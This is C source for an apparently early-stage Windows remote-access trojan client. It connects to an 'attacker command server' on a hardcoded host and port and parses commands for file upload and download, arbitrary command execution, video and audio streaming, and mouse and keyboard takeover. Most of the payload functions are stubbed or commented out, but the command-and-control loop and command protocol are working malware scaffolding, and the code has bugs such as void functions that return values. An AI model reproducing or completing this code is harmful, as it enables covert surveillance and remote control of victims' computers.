#define _WINSOCK_DEPRECATED_NO_WARNINGS // TODO - fix this

#include<stdio.h> // standard input/output
#include<winsock2.h> // windows socket header

#pragma comment(lib,"ws2_32.lib") // tell the linker to link the winsock library

// attacker IP and primary communication port
#define CMD_SERVER_ADDR "127.0.0.1"
#define CMD_SERVER_PORT 8080

// change directory and list directory contents
#define CHANGE_DIR 1
#define LIST_DIR 2
// upload and download files (from attacker's perspective)
#define UPLOAD 3
#define DOWNLOAD 4
// run an arbitrary comamnd
#define RUN_CMD 5
// start and end video, mouse, and audio streams
#define START_VID 6
#define END_VID 7
#define START_MOUSE 8
#define END_MOUSE 9
#define START_AUDIO 10
#define END_AUDIO 11
#define START_KEYS 13
#define END_KEYS 14
// end the process
#define KILL_PROC 12

// helper function for exiting on error
void exitOnError() {
	printf("Exiting program...\n");
	return 1;
}

/*
* Handle commands from the attacker server
* Return the #DEFINE associated with the command
*/
char handleCommand(char* buffer) {
	// get the command sent
	char cmd = buffer[0];
	// check what the command was and call the appropriate function
	if (cmd == CHANGE_DIR) { // TODO - complete this later as QoL feature
		printf("Changing directory...\n");
		// shift the buffer left by one to get just the name of the directory to change to
		for (int i = 1; i < 4096 && buffer[i-1] != '\0'; i++) {
			buffer[i - 1] = buffer[i]; }
		printf("Changing to directory %s\n", buffer);
		//changeDirectory(buffer);
	} else if (cmd == LIST_DIR) { // TODO - complete this later as QoL feature
		printf("Listing directoy contents\n");
		//listDirectoryContents();
	} else if (cmd == DOWNLOAD) {
		printf("Uploading file to controller\n");
		// get the port to connect to then shift the buffer to be just the file name
		int port = (buffer[1] * 256) + buffer[2];
		for (int i = 3; i < 4096 && buffer[i - 1] != '\0'; i++) {
			buffer[i - 3] = buffer[i]; }
		printf("Uploading file %s on port %d\n", buffer, port);
		//uploadFile(port, buffer);
	} else if (cmd == UPLOAD) {
		printf("Downloading file from controller\n");
		// get the port to connect to then shift the buffer to be just the file name
		int port = (buffer[1] * 256) + buffer[2];
		for (int i = 3; i < 4096 && buffer[i - 1] != '\0'; i++) {
			buffer[i - 3] = buffer[i];
		}
		printf("Downloading file %s on port %d\n", buffer, port);
		//downloadFile(port, buffer);
	} else if (cmd == RUN_CMD) {
		printf("Running command prompt arguments...\n");
		// shift the buffer left by one to get just command and its arguments
		for (int i = 1; i < 4096 && buffer[i - 1] != '\0'; i++) {
			buffer[i - 1] = buffer[i]; }
		printf("Running %s from command prompt\n", buffer);
		//runCommandPrompt(buffer);
	} else if (cmd == START_VID) {
		printf("Starting video stream...\n");
		// get the port to connect to
		int port = (buffer[1] * 256) + buffer[2];
		printf("Streaming video to attacker on port %d\n", port);
		//streamVideo(port);
	} else if (cmd == END_VID) {
		// TODO - determine how best to stop video stream
	} else if (cmd == START_MOUSE) {
		printf("Taking control of mouse...\n");
		// get the port to connect to
		int port = (buffer[1] * 256) + buffer[2];
		printf("Attacker is controlling mouse from port %d\n", port);
		//controlMouse(port);
	} else if (cmd == END_MOUSE) {
		// TODO - determine how best to stop mouse control
	} else if (cmd == START_AUDIO) {
		printf("Starting audio stream...\n");
		// get the port to connect to
		int port = (buffer[1] * 256) + buffer[2];
		printf("Streaming audio to attacker on port %d\n", port);
		//streamAudio(port);
	} else if (cmd == END_AUDIO) {
		// TODO - determine how best to stop audio stream
	} else if (cmd == START_KEYS) {
		printf("Taking control of keyboard...\n");
		// get the port to connect to
		int port = (buffer[1] * 256) + buffer[2];
		printf("Attacker is controlling keyboard from port %d\n", port);
		//controlKeyboard(port);
	} else if (cmd == END_KEYS) {
		// TODO - determine how best to stop keyboard control
	} else if (cmd == KILL_PROC) {
		printf("Ending process...\n");
	} else {
		printf("Unknown command received: %d\n", cmd);
	}
	return cmd;
}

/*
* Connect to the primary command server
* This is where we'll get the commands to do stuff
* Secondary connections will be set up for streaming other data
*/
void connectToCommandServer() {
	SOCKET sock; // TODO - might need to make this global
	struct sockaddr_in server;
	int retCode;
	char cmd;
	char buffer[4096];

	// create the TCP socket
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		printf("Could not create socket: %d\n", WSAGetLastError());
		exitOnError();
	}

	// set the server info structure
	server.sin_addr.s_addr = inet_addr(CMD_SERVER_ADDR);
	server.sin_family = AF_INET;
	server.sin_port = htons(CMD_SERVER_PORT);

	// connect to the attacker command server
	if (connect(sock, (struct sockaddr*)&server, sizeof(server)) != 0) {
		printf("Could not connect to command server! Error code: %d\n", WSAGetLastError());
		exitOnError();
	} else {
		printf("Connected to command server\n");
	}

	// get and process commands from the attacker
	do {
		// get the next command and check for errors or a closed connection
		retCode = recv(sock, buffer, 4096, 0);
		if (retCode == 0) {
			printf("Connection closed...\nExiting program...\n");
			return 0;
		} else if (retCode < 0) {
			printf("Recv failed with error: %d\n", WSAGetLastError());
			exitOnError();
		}
		// if we got this far, we have a valid message to process
		cmd = handleCommand(buffer);
	} while (cmd != KILL_PROC);

	// TODO - kill the connection gracefully
}

// TODO - remove testing function once no longer needed
void test() {
	char buffer[] = { CHANGE_DIR, 'C', ':', '\\', 'U', 's', 'e', 'r', 's', '\0' };
	handleCommand(buffer);
	char buffer2[] = {LIST_DIR, 'D', '\0' };
	handleCommand(buffer2);
	char buffer3[] = { UPLOAD, 127, 35, 'w', 'a', 'l', 'l', '.', 'p', 'n', 'g', '\0' };
	handleCommand(buffer3);
	char buffer4[] = { DOWNLOAD, 127, 35, 'w', 'a', 'l', 'l', '.', 'p', 'n', 'g', '\0' };
	handleCommand(buffer4);
}

int main(int argc, char* argv[]) {
	WSADATA wsa;
	// initialize winsock
	int retCode = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (retCode != 0) {
		printf("WSAStartup failed with error: %d\n", retCode);
		exitOnError();
	}
	//test();
	// connect to the command server
	connectToCommandServer();
	return 0;
}